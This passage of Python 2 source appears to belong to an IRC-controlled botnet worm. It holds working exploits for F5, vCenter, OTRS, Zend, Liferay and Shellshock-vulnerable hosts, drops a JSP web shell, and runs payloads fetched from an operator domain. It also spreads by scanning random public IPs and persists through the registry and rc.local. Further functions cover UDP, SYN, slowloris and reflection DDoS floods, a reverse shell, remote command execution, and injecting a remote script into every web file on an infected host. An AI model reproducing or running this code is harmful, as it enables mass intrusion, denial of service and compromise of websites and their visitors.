                   urllib2.urlopen(urllib2.Request(url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command="+urllib.encode(stupidnigeria), headers={"User-Agent" : myuseragent}), context=self.ctx)
               except:
                   pass
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url + "/cgi-bin/slogin/login.py","",headers={"User-Agent" : "() { :; }; echo ; echo ; /bin/sh -c " + stupidnigeria + " ' bash -s :'"}))
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url+'/ui/vropspluginui/rest/services/uploadova',"",headers={"User-Agent" : myuseragent}),context=self.ctx)
        except urllib2.HTTPError as e:
            if e.code == 405:
                try:
                    tmpdir=(os.getenv("TEMP") if os.name=="nt" else "/tmp")+os.path.sep
                    x=open(tmpdir+"3.jsp","w")
                    x.write("3c2540207061676520696d706f72743d276a6176612e696f2e52756e74696d652720253e3c25207472797b52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d6574657228227461722229293b636174636828494f457863657074696f6e2065297b7d20253e".decode("HEX"))
                    x.close()
                    tarf=tarfile.open(tmpdir+'1.tar','w')
                    traversal=".."+"\\"
                    fullpath=traversal*5+"ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\upload.jsp"
                    tarf.add(tmpdir+"3.jsp",fullpath.replace('/','\\').replace('\\\\','\\'))
                    tarf.close()
                    tarf=tarfile.open(tmpdir+'2.tar','w')
                    traversal=".."+"/"
                    fullpath=traversal*5+"/var/www/html/upload.jsp"
                    tarf.add(tmpdir+"3.jsp",fullpath.replace('\\','/').replace('//','/'))
                    tarf.close()
                    for x in [1,2]:
                        try:
                            boundary=os.urandom(16).encode('hex')
                            f=open(tmpdir+str(x)+'.tar')
                            body="--%s\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"upload.tar\"\r\n\r\n%s\r\n--%s--\r\n" % (boundary,f.read(),boundary)
                            f.close()
                            urllib2.urlopen(urllib2.Request(url+'/ui/vropspluginui/rest/services/uploadova',body,headers={"User-Agent" : myuseragent,"Content-Type" : "multipart/form-data; boundary="+boundary,"Accept-Encoding" : "gzip,deflate"}),context=self.ctx)
                        except:
                            pass
                        try:
                            if x == 1:
                               urllib2.urlopen(urllib2.Request(url+'/upload.jsp?tar='+"cmd /C "+winbox,headers={"User-Agent" : myuseragent}),context=self.ctx)
                            else:
                               urllib2.urlopen(urllib2.Request(url+'/upload.jsp?tar='+stupidnigeria,headers={"User-Agent" : myuseragent}),context=self.ctx)
                        except:
                             pass
                except:
                    pass
        except:
            pass
        try:
            try:
                username = "root@localhost"
                password = "root"
                mycookie = urllib2.urlopen(urllib2.Request(url, {"Action":"Login","RequestedURL":"","Lang":"en","TimeOffset":"-480","User":username,"Password":password}, headers={"User-Agent" : myuseragent}), context=self.ctx).headers.get('Set-Cookie')
                if "OTRSAgentInterface" not in mycookie:
                    return
                contents = urllib2.urlopen(urllib2.Request(url+"/?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework", "", headers={"User-Agent" : myuseragent, "Cookie" : mycookie}), context=self.ctx).read()
                challTokenStart = contents.find('<input type="hidden" name="ChallengeToken" value="')+50;
                challengeToken = contents[challTokenStart:challTokenStart+32];
                settings = {"ChallengeToken":challengeToken,"Action":"AdminSysConfig","Subaction":"Update","SysConfigGroup":"Framework","SysConfigSubGroup":"Crypt::PGP","DontWriteDefault":"1","PGP":"1","PGP::Bin":"/bin/sh","PGP::Options":"-c '"+stupidnigeria+"'","PGP::Key::PasswordKey[]":"488A0B8F","PGP::Key::PasswordContent[]":"SomePassword","PGP::Key::PasswordDeleteNumber[]":"1","PGP::Key::PasswordKey[]":"D2DF79FA","PGP::Key::PasswordContent[]":"SomePassword","PGP::Key::PasswordDeleteNumber[]":"2","PGP::TrustedNetworkItemActive":"1","PGP::TrustedNetwork":"0","PGP::LogKey[]":"BADSIG","PGP::LogContent[]":"The+PGP+signature+with+the+keyid+has+not+been+verified+successfully.","PGP::LogDeleteNumber[]":"1","PGP::LogKey[]":"ERRSIG","PGP::LogContent[]":"It+was+not+possible+to+check+the+PGP+signature%2C+this+may+be+caused+by+a+missing+public+key+or+an+unsupported+algorithm.","PGP::LogDeleteNumber[]":"2","PGP::LogKey[]":"EXPKEYSIG","PGP::LogContent[]":"The+PGP+signature+was+made+by+an+expired+key.","PGP::LogDeleteNumber[]":"3","PGP::LogKey[]":"GOODSIG","PGP::LogContent[]":"Good+PGP+signature.","PGP::LogDeleteNumber[]":"4","PGP::LogKey[]":"KEYREVOKED","PGP::LogContent[]":"The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.","PGP::LogDeleteNumber[]":"5","PGP::LogKey[]":"NODATA","PGP::LogContent[]":"No+valid+OpenPGP+data+found.","PGP::LogDeleteNumber[]":"6","PGP::LogKey[]":"NO_PUBKEY","PGP::LogContent[]":"No+public+key+found.","PGP::LogDeleteNumber[]":"7","PGP::LogKey[]":"REVKEYSIG","PGP::LogContent[]":"The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.","PGP::LogDeleteNumber[]":"8","PGP::LogKey[]":"SIGEXPIRED","PGP::LogContent[]":"The+PGP+signature+is+expired.","PGP::LogDeleteNumber[]":"9","PGP::LogKey[]":"SIG_ID","PGP::LogContent[]":"Signature+data.","PGP::LogDeleteNumber[]":"10","PGP::LogKey[]":"TRUST_UNDEFINED","PGP::LogContent[]":"This+key+is+not+certified+with+a+trusted+signature%21.","PGP::LogDeleteNumber[]":"11","PGP::LogKey[]":"VALIDSIG","PGP::LogContent[]":"The+PGP+signature+with+the+keyid+is+good.","PGP::LogDeleteNumber[]":"12","PGP::StoreDecryptedData":"1"}
                urllib.urlopen(urllib2.Request(url+"/?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework", data=settings, headers={"User-Agent" : myuseragent, "Cookie" : mycookie}), context=self.ctx)
                urllib.urlopen(urllib2.Request(url+"/?Action=AdminPGP","", headers={"User-Agent" : myuseragent, "Cookie" : mycookie}), self.ctx)
            except:
                pass
            out = StringIO()
            with gzip.GzipFile(fileobj=out, mode="w") as f:
                f.write('O:25:"Zend\\Http\\Response\\Stream":2:{s:10:"\0*\0cleanup";b:1;s:13:"\0*\0streamName";O:25:"Zend\\View\\Helper\\Gravatar":2:{s:7:"\0*\0view";O:30:"Zend\\View\\Renderer\\PhpRenderer":1:{s:41:"\0Zend\\View\\Renderer\\PhpRenderer\0__helpers";O:31:"Zend\\Config\\ReaderPluginManager":2:{s:11:"\0*\0services";a:2:{s:10:"escapehtml";O:23:"Zend\\Validator\\Callback":1:{s:10:"\0*\0options";a:2:{s:8:"callback";s:6:"system";s:15:"callbackOptions";a:1:{i:0;s:959:"echo ' + b64encode(stupidnigeria) + '|base64 -d|sh";}}}s:14:"escapehtmlattr";r:7;}s:13:"\0*\0instanceOf";s:23:"Zend\\Validator\\Callback";}}s:13:"\0*\0attributes";a:1:{i:1;s:1:"a";}}}')
            zsploitlinux = {
                'hello' : b64encode(out.getvalue())
            }
            out = StringIO()
            with gzip.GzipFile(fileobj=out, mode="w") as f:
                f.write('O:25:"Zend\\Http\\Response\\Stream":2:{s:10:"\0*\0cleanup";b:1;s:13:"\0*\0streamName";O:25:"Zend\\View\\Helper\\Gravatar":2:{s:7:"\0*\0view";O:30:"Zend\\View\\Renderer\\PhpRenderer":1:{s:41:"\0Zend\\View\\Renderer\\PhpRenderer\0__helpers";O:31:"Zend\\Config\\ReaderPluginManager":2:{s:11:"\0*\0services";a:2:{s:10:"escapehtml";O:23:"Zend\\Validator\\Callback":1:{s:10:"\0*\0options";a:2:{s:8:"callback";s:6:"system";s:15:"callbackOptions";a:1:{i:0;s:959:"powershell Invoke-Expression ' + b64encode("(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/py.exe','python.exe');(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/setup.py','setup.py');".replace("DOMAIN", mydomain)) + ' &.\python.exe setup.py";}}}s:14:"escapehtmlattr";r:7;}s:13:"\0*\0instanceOf";s:23:"Zend\\Validator\\Callback";}}s:13:"\0*\0attributes";a:1:{i:1;s:1:"a";}}}')
            zsploitwin = {
                'hello' : b64encode(out.getvalue())
            }
            try:
                urllib2.urlopen(urllib2.Request(url+"/zend3/public/", urllib.urlencode(zsploitlinux), headers={'Content-Type': 'application/json', 'User-Agent' : myuseragent}), context=self.ctx)
            except:
                pass
            try:
                urllib2.urlopen(urllib2.Request(url+"/zend3/public/", urllib.urlencode(zsploitwin), headers={'Content-Type': 'application/json', 'User-Agent' : myuseragent}), context=self.ctx)
            except:
                pass
            try:
                urllib2.urlopen(urllib2.Request(url+"/api/jsonws/expandocolumn/update-column", data=urllib.urlencode({'columnId': '1', 'name': '2', 'type': '3', '+defaultData': 'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource','defaultData.userOverridesAsString': 'HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707874000a4576696c4f626a656374740049687474703a2f2f'+mydomain+'2f740003466f6f;'}), headers={'Content-Type': 'application/json', 'Authorization' : 'Basic dGVzdEBsaWZlcmF5LmNvbTp0ZXN0','User-Agent' : myuseragent}), context=self.ctx)
            except:
                pass
        except:
            pass
        try:
            self.scanips.remove(ip)
        except:
            pass
    def gen_IP(self):
        not_valid = [10,127,169,172,192,233,234]
        fioasadihco = random.randrange(1,256)
        while fioasadihco in not_valid:
            fioasadihco = random.randrange(1,256)
        ip = ".".join([str(fioasadihco),str(random.randrange(1,256)),
        str(random.randrange(1,256)),str(random.randrange(1,256))])
        return ip
    def worker(self, thrid):
        global paramiko_imported,portlist
        while True:
            while self.scannerenabled==0:
                time.sleep(1)
            address = self.gen_IP()
            for theport in portlist:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(6.2)
                    s.connect((address, theport))
                    s.close()
                    self.exploit(address, theport, thrid)
                except:
                    pass
    def dajsJgBT(self):
        if os.name == 'nt':
            try:
                aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
                aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
                SetValueEx(aKey,"System explore",0, REG_SZ, os.getenv("USERPROFILE") + "\\$6829.exe " + os.path.r)
                windll.kernel32.SetFileAttributesW(os.getenv("USERPROFILE") + "\\$6829.exe", FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
            return
        else:
            try:
                resolv=open("/etc/resolv.conf", "w")
                resolv.write("nameserver 1.1.1.1\nnameserver 1.0.0.1\n")
                resolv.close()
                rc=open("/etc/rc.local","rb")
                data=rc.read()
                rc.close()
                if "boot" not in data:
                    with open(myfullpath, 'rb') as source, open("/etc/boot", 'wb') as destin:
                        while True:
                            copybuff = source.read(1024*1024)
                            if not copybuff:
                                break
                            destin.write(copybuff)
                    os.chmod("/etc/boot", 777)
                    rc=open("/etc/rc.local","wb")
                    if "exit" in data:
                        rc.write(data.replace("exit", "/etc/boot\nexit"))
                    else:
                        rc.write("\n/etc/boot")    
                    rc.close()
            except:
                pass
    def udp_attack(self,targhost,attkport,attktime):   
        if str(attkport).startswith("0"):
            sendpkt=os.urandom(random.randint(1024,65507))
        else:
            sendpkt="\xff"*65507
        endtime=time.time()+attktime
        while endtime>time.time():
            if self.stopshit == 1:
                break
            try:
                tmpsck=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if attkport==0:
                    tmpsck.sendto(sendpkt,(targhost, random.randrange(1,65535)))
                else:
                    tmpsck.sendto(sendpkt,(targhost, attkport))
            except:
                pass
    def syn_attack(self,EBcZqJni,attkport,attktime):
        endtime=time.time()+attktime
        while endtime>time.time():
            if self.stopshit == 1:
                return
            try:
                tmpsck=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                tmpsck.settimeout(0.001)
                tmpsck.connect((EBcZqJni, attkport))
            except:
                pass
    def tcp_attack(self,EBcZqJni,attkport,attktime):
        endtime=time.time()+attktime
        while endtime>time.time():
            if self.stopshit == 1:
                return
            try:
                tmpsck=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                tmpsck.connect((EBcZqJni, attkport))
                tmpsck.send(os.urandom(ramom.randint(1024, 65535)))
                tmpsck.close()
            except:
                pass
    def slowloris(self,gSRaQsAT, ekAcxzEz, sockets, attktime):
        endtime=time.time()+attktime
        fds = []
        for QBQtdKIm in xrange(0, int(sockets)):
            fds.append(0)
        while 1:
            if self.stopshit == 1:
                break
            for QBQtdKIm in xrange(0, int(sockets)):
                if self.stopshit == 1:
                    break
                fds[QBQtdKIm] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    fds[QBQtdKIm].connect((gSRaQsAT, int(ekAcxzEz)))
                except:
                    pass
            PGRzbfUd = "GET / HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n" % (gSRaQsAT, ekAcxzEz, random.choice(self.GbASkEbE))
            for nHrRZUKk in PGRzbfUd:
                if self.stopshit == 1:
                    break
                for fd in fds:
                    try:
                        fd.send(nHrRZUKk)
                    except:
                        try:
                            fd.connect((gSRaQsAT, int(ekAcxzEz)))
                        except:
                            pass
                if endtime<time.time():
                    for fd in fds:
                        try:
                            fd.close()
                        except:
                            pass
                    return
                time.sleep(1)
    def sMTJQLQX(self,bZtHOlSl):
        try:
            req = urllib2.Request(bZtHOlSl)
            req.add_header('User-Agent', random.choice(self.GbASkEbE))
            return urllib2.urlopen(req).read()
        except:
            return ""
    def sMTJQLQXTor(self,bZtHOlSl):
        global proxylist
        try:
            myproxy = random.choice(proxylist)
            ss=socks.socksocket()
            ss.setproxy(socks.PROXY_TYPE_SOCKS5, myproxy.split(":")[0], int(myproxy.split(":")[1]), True)
            ss.connect((bZtHOlSl.split("//")[-1].split("/")[0].split('?')[0], 80))
            ss.send("GET " + "/"+"/".join(bZtHOlSl.split("://")[1].split("/")[1:]) + " HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n")
            x=self.recvTimeout(ss, 1024*1024, 1)
            ss.close()
            x="\r\n\r\n".join(x.split("\r\n\r\n")[1:])
            x="\n\n".join(x.split("\n\n")[1:])
            return x
        except:
            return ""
    def https_rflood(self,url,recursive,attktime):
        if recursive=="true" or recursive == "1":
            endtime=time.time()+attktime
            AkNEnSD='3d5b27225d3f285b5e2722203e5d2b29'.decode("HEX")
            while endtime>time.time():
                if self.stopshit == 1:
                    break
                for TDibPNtf in re.findall('href'+AkNEnSD,self.sMTJQLQX(url), re.I):
                    if self.stopshit == 1:
                        break
                    self.sMTJQLQX(TDibPNtf)
                for TDibPNtf in re.findall('src'+AkNEnSD,self.sMTJQLQX(url), re.I):
                    if self.stopshit == 1:
                        break
                    self.sMTJQLQX(TDibPNtf)
        else:
            endtime=time.time()+attktime
            while endtime>time.time():
                if self.stopshit == 1:
                    break
                self.sMTJQLQX(url)
    def https_rfloodTor(self,url,recursive,attktime):
        if recursive=="true" or recursive == "1":
            endtime=time.time()+attktime
            AkNEnSD='3d5b27225d3f285b5e2722203e5d2b29'.decode("HEX")
            while endtime>time.time():
                if self.stopshit == 1:
                    break
                for TDibPNtf in re.findall('href'+AkNEnSD,self.sMTJQLQXTor(url), re.I):
                    if self.stopshit == 1:
                        break
                    self.sMTJQLQXTor(TDibPNtf)
                for TDibPNtf in re.findall('src'+AkNEnSD,self.sMTJQLQXTor(url), re.I):
                    if self.stopshit == 1:
                        break
                    self.sMTJQLQXTor(TDibPNtf)
        else:
            endtime=time.time()+attktime
            while endtime>time.time():
                if self.stopshit == 1:
                    break
                self.sMTJQLQXTor(url)
    def checkIPport(self,awRLHHhl,theport,shouldisploit,inputstr):
        self.scanthreadzactive += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((awRLHHhl, theport))
            s.close()
            self.exploitstats[inputstr][1] += 1
            if shouldisploit == "true" or shouldisploit == "yes" or shouldisploit == "1":
                self.exploit(awRLHHhl,theport)
        except:
            pass
        self.scanthreadzactive -= 1
    def scanIP(self,awRLHHhl,attkport,shouldisploit,inputstr,thrid):
        global portlist
        foundopen = 0
        self.scanthreadzactive += 1
        try:
            if attkport == "allports":
                for theport in portlist:
                    threading.Thread(target=self.checkIPport, args=(awRLHHhl,theport,shouldisploit,inputstr,thrid,)).start()
            else:
                self.checkIPport(awRLHHhl,attkport,shouldisploit)
        except:
            pass
        if foundopen == 1:
            self.exploitstats[inputstr][1] += 1
        self.exploitstats[inputstr][0] += 1
        self.scanthreadzactive -= 1
    def getMyCurrentIP(self):
        myip="Unknown"
        try:
            myip=urllib2.urlopen("https://api.ipify.org/").read()
        except:
            try:
                myip=urllib2.urlopen("http://ipinfo.io/ip").read()
            except:
                try:
                    myip=urllib2.urlopen("https://www.trackip.net/ip").read()
                except:
                    try:
                        myip=urllib2.urlopen("http://ifconfig.me/").read()
                    except:
                        try:
                            myip=urllib2.urlopen("http://icanhazip.com/").read().replace("\n","")
                        except:
                            pass
        return myip
    def CUhKIvCh(self,inputstr,attkport,shouldisploit):
        global portlist
        try:
            if inputstr == "nearme":
                mypublicip=self.getMyCurrentIP()
                if mypublicip!=None:
                    inputstr=mypublicip+"/16"
            elif inputstr == "lan":
                inputstr=mylanip+"/16"
            else:
                not_valid = [10,127,169,172,192,233,234]
                fioasadihco = random.randrange(1,256)
                while fioasadihco in not_valid:
                    fioasadihco = random.randrange(1,256)
                if inputstr=="b-class":
                    WZvOFyxlC=str(fioasadihco)+"."+str(random.randrange(1,256))+".0.0/16"
                elif inputstr=="c-class":
                    inputstr=str(fioasadihco)+"."+str(random.randrange(1,256))+"."+str(random.randrange(1,256))+".0/24"
        except:
            self.commSock.send("PRIVMSG %s :Failed to grab IP\n" % (self.mychan))
            return
        (addrString, cidrString) = inputstr.split('/')
        ipaddr = addrString.split('.')
        cidrR = int(cidrString)
        netmask = [0, 0, 0, 0]
        for i in range(cidrR):
            netmask[i/8] = netmask[i/8] + (1 << (7 - i % 8))
        netip = []
        for i in range(4):
            netip.append(int(ipaddr[i]) & netmask[i])
        broad = list(netip)
        brange = 32 - cidrR
        for i in range(brange):
            broad[3 - i/8] = broad[3 - i/8] + (1 << (i % 8))
        net_mask = ".".join(map(str, netmask))
        from_ip = ".".join(map(str, netip))
        to_ip = ".".join(map(str, broad))
        startipaddr = struct.unpack('>I', socket.inet_aton(".".join(map(str, netip))))[0]
        endipaddr = struct.unpack('>I', socket.inet_aton(".".join(map(str, broad))))[0]
        shouldisploit = shouldisploit.lower()
        if shouldisploit == "true" or shouldisploit == "yes" or shouldisploit == "1":
            if attkport == "allports":
                self.commSock.send("PRIVMSG %s :Exploit scanning %s on port %s\n" % (self.mychan,"%s - %s" % (from_ip, to_ip),str(portlist)))
            else:
                self.commSock.send("PRIVMSG %s :Exploit scanning %s on port %s\n" % (self.mychan,"%s - %s" % (from_ip, to_ip),attkport))
        else:
            self.commSock.send("PRIVMSG %s :Scanning %s on port %s\n" % (self.mychan,"%s - %s" % (from_ip, to_ip),attkport))
        self.exploitstats[inputstr] = [0,0]
        for i in range(startipaddr, endipaddr):
            addr2scan = socket.inet_ntoa(struct.pack('>I', i))
            try:
                if self.stopshit == 1 or self.scannerenabled == 0:
                    return
                while self.scanthreadzactive >= (self.available_cpu_count() * 10):
                    time.sleep(0.1)
                threading.Thread(target=self.scanIP, args=(addr2scan,attkport,shouldisploit,inputstr,thrid,)).start()
            except:
                pass
        self.commSock.send("PRIVMSG %s :Finished scanning range %s\n" % (self.mychan,inputstr))
    def ATTAKMYBRUDDA(self, attkproto, targ_et, timee, threads):
        self.domains = [['\x10','amazon.com'],['\x10','live.com'],['\x10','office.com'],['\x10','discord.com'],['\x10','wikihow.com'],['\x10','redbubble.com'],['\x10','coupang.com'],['\x10','politico.com'],['\x10','ria.ru'],['\x10','gds.it'],['\x10','teespring.com'],['\x10','quizizz.com'],['\x10','audible.com'],['\x10','bb.com.br'],['\x10','xbox.com'],['\x10','jpmorganchase.com'],['\x10','sagepub.com'],['\x10','clarin.com'],['\x10','kickstarter.com'],['\x10','study.com'],['\x10','greythr.com'],['\x10','telekom.com'],['\x10','smartrecruiters.com'],['\xff','gazeta.ru'],['\xff','valuecommerce.ne.jp'],['\x10','sii.cl'],['\x10','rt.ru'],['\xff','inoreader.com'],['\xff','freepik.es'],['\x10','yemek.com'],['\x10','hapitas.jp'],['\x10','xoom.com'],['\xff','belwue.de'],['\xff','fanfiction.net'],['\x10','tasteofhome.com'],['\x10','skyroom.online'],['\x10','duosecurity.com'],['\x10','difi.no'],['\x10','indodax.com'],['\x10','williams-sonoma.com'],['\xff','kamihq.com'],['\x10','lamoda.ru'],['\x10','mononews.gr'],['\x10','tineye.com'],['\x10','santander.com.mx'],['\xff','theclutcher.com'],['\x10','emailanalyst.com'],['\x10','coincheck.com'],['\x10','tuya.com'],['\x10','atlantico.eu'],['\x10','unicef.org'],['\x10','bizpacreview.com'],['\xff','torontomls.net'],['\x10','nobroker.in'],['\x10','paytmmall.com'],['\x10','jornaldeangola.ao'],['\x10','timesjobs.com'],['\x10','watcha.com'],['\x10','samcart.com'],['\xff','wpbeginner.com'],['\x10','ssrn.com'],['\x10','lastpass.com'],['\x10','tweakers.net'],['\xff','animego.org'],['\x10','thriftbooks.com'],['\x10','homecenter.com.co'],['\x10','etnews.com'],['\x10','designhill.com'],['\xff','wavve.com'],['\x10','umh.es'],['\x10','papaki.com'],['\x10','military.com'],['\xff','infojobs.com.br'],['\x10','qwiklabs.com'],['\xff','immi.gov.au'],['\x10','stash.com'],['\x10','mps.it'],['\xff','apowersoft.com'],['\x10','impact.com'],['\xff','jasminsoftware.pt'],['\x10','filmstarts.de'],['\x10','growthhackers.com'],['\x10','hs.fi'],['\x10','rubiconproject.com'],['\x10','alchemer.com'],['\xff','mahacet.org'],['\x10','datorama.com'],['\x10','npmjs.com']]
        for i in range(threads):
            threading.Thread(target=self.__attack, args=(attkproto,targ_et,time.time()+timee)).start()
    def __send(self, targ_et, sock, soldier, attkproto, payload):
        PORTS = {
            'dns': 53,
            'ntp': 123,
            'cldap': 389,
            'snmp': 161,
        }
        udp = UDPHEADER(random.randint(1, 65535), PORTS[attkproto], payload).mkpkt(targ_et, soldier)
        ip = IPHEADER(targ_et, soldier, udp, ipproto=socket.IPPROTO_UDP).mkpkt()
        sock.sendto(ip+udp+payload, (soldier, PORTS[attkproto]))
    def fuCK(self,sackss):
        return chr(len(sackss)) + sackss
    def make_dns_query_domain(self, domain):
        parts = domain.split('.')
        parts = list(map(self.fuCK, parts))
        return ''.join(parts)
    def make_dns_request_data(self, dns_query, qtype):
        req = os.urandom(2) + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        req += dns_query
        req += '\x00\x00' + qtype + '\x00\x01'
        return req
    def __attack(self, attkproto, targ_et, timeend):
        FILE_HANDLE=open("." + attkproto, "r")
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        i = 0
        while 1:
            try:
                if time.time()>=timeend or self.stopshit == 1:
                    break
                soldier = FILE_HANDLE.readline().strip()
                if soldier:
                    if attkproto=='dns':
                        dnsdomain = random.choice(self.domains)
                        self.__send(targ_et, sock, soldier, attkproto, self.make_dns_request_data(self.make_dns_query_domain(dnsdomain[1]), dnsdomain[0]))
                    else:
                        self.__send(targ_et, sock, soldier, attkproto, PAYLOAD[attkproto])
                else:
                    FILE_HANDLE.seek(0)
            except:
                pass
        try:
            FILE_HANDLE.close()
        except:
            pass
    def reverseShell(self, ip, port):
        if not os.name == 'nt':
            import pty
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip, int(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
        else:
            pass
    def shell_(self, cmd, SendEr):
        try:
            running = subprocess.Popen(cmd,stdout=subprocess.PIPE,shell=True)
            while True:
                output = running.stdout.readline()
                if running.poll() is not None and output == '':
                    break
                if output:
                    self.commSock.send("PRIVMSG %s :%s\n" % (SendEr,output))
        except:
            pass
    def nth_repl(self,s, sub, repl, n):
        find = s.find(sub)
        i = find != -1
        while find != -1 and i != n:
            find = s.find(sub, find + 1)
            i += 1
        if i == n:
            return s[:find] + repl + s[find+len(sub):]
        return s
    def infectfile(self, filename):
        global mymac
        try:
            infectedfile=False
            filename=os.path.realpath(filename)
            filetimes=(os.path.getatime(filename), os.path.getmtime(filename))
            filehandle=open(filename,"rb")
            filedata=filehandle.read()
            filehandle.close()
            randvar = randomstring(8)
            rand2var = randomstring(8)
            encodedurl = b64encode("//" + mydomain + "/campaign.js")
            injectscript="(function(" + rand2var + ", " + randvar + ") {" + randvar + " = " + rand2var + ".createElement('script');" + randvar + ".type = 'text/javascript';" + randvar + ".async = true;" + randvar + ".src = atob('" + mymac + encodedurl + mymac + "'.replace(/" + mymac + "/gi, '')) + '?' + String(Math.random()).replace('0.','');" + rand2var + ".getElementsByTagName('body')[0].appendChild(" + randvar + ");}(document));"
            macsplit=filedata.split(mymac)
            if len(macsplit) > 1:
                if macsplit[1] != encodedurl:
                    filedata=filedata.replace(macsplit[1], encodedurl)
                    self.jsfilesbdoored+=1
                    infectedfile = True
                elif macsplit[1] == encodedurl:
                    self.jsfilesbdoored+=1
                    return
            else:
                if filename.endswith(".js"):
                    if "var " in filedata:
                        filedata=self.nth_repl(filedata, "var ", injectscript + "var ", 1)
                        self.jsfilesbdoored+=1
                        infectedfile = True
                else:
                    if "</body" in filedata:
                        filedata=self.nth_repl(filedata, "</body", "<script type=" + '"' + "text/javascript" + '"' + ">" + injectscript + "</script></body", 1)
                        self.jsfilesbdoored+=1
                        infectedfile = True
            if infectedfile:
                filehandle=open(filename, "wb")
                filehandle.write(filedata)
                filehandle.close()
            os.utime(filename, filetimes)
        except:
            pass
    def infecthtmljs(self):
        if os.name != "nt":
            self.jsfilesbdoored=0
            for tosearch in [ele for ele in os.listdir("/") if ele not in ["proc", "bin", "sbin", "sbin", "dev", "lib", "lib64", "lost+found", "sys", "boot", "etc"]]:
                for extension in ["*.js", "*.html", "*.htm", "*.php"]:
                    for filename in os.popen("find \"/" + tosearch + "\" -type f -name \"" + extension + "\"").read().split("\n"):
                        filename = filename.replace("\r", "").replace("\n", "")
                        if "node" not in filename and 'lib' not in filename and "npm" not in filename and filename != "":
                            self.infectfile(filename)
    def dlexe(self, url, saveas):
        try:
            fh=open(saveas, "wb")
            fh.write(urllib2.urlopen(url).read())
            fh.close()
            os.startfile(saveas)
        except:
            pass
    def iprange_assault(self, classtype, rangee, attkport, attktime):
        if str(attkport).startswith("0"):
            sendpkt=os.urandom(random.randint(1024,65507))
        else:
            sendpkt="\xff"*65507
        endtime=time.time()+attktime
        while endtime>time.time():
            if self.stopshit == 1:
                break
            if classtype=="A":
                 targhost=rangee+"."+str(random.randint(0,255))+"."+str(random.randrange(0,255))+"."+str(random.randrange(0,255))
            elif classtype=="B":
                 targhost=rangee+"."+str(random.randint(0,255))+"."+str(random.randrange(0,255))
            elif classtype=="C":
                 targhost=rangee+"."+str(random.randint(0,255))
            try:
                tmpsck=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if attkport==0:
                    tmpsck.sendto(sendpkt,(targhost, random.randrange(1,65535)))
                else:
                    tmpsck.sendto(sendpkt,(targhost, attkport))
            except:
                pass
    def interpretcmd(self, argumentdata):
        global loggedin,portlist
        SendEr=argumentdata[2]
        try:
            if argumentdata[3]==":" + self.cmdprefix + "logout":
                loggedin=-1
                self.commSock.send("PRIVMSG %s :De-Authorization successful\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "udpflood":
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.udp_attack,args=(argumentdata[4],int(argumentdata[5]),int(argumentdata[6]),)).start()
                if argumentdata[5] == "0":
                    argumentdata[5] = "random"
                self.commSock.send("PRIVMSG %s :Started UDP flood on %s:%s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "synflood":
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.syn_attack,args=(argumentdata[4],int(argumentdata[5]),int(argumentdata[6],))).start()
                self.commSock.send("PRIVMSG %s :Started SYN flood on %s:%s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "tcpflood":
                for i in range(0, int(argumentdata[7])):
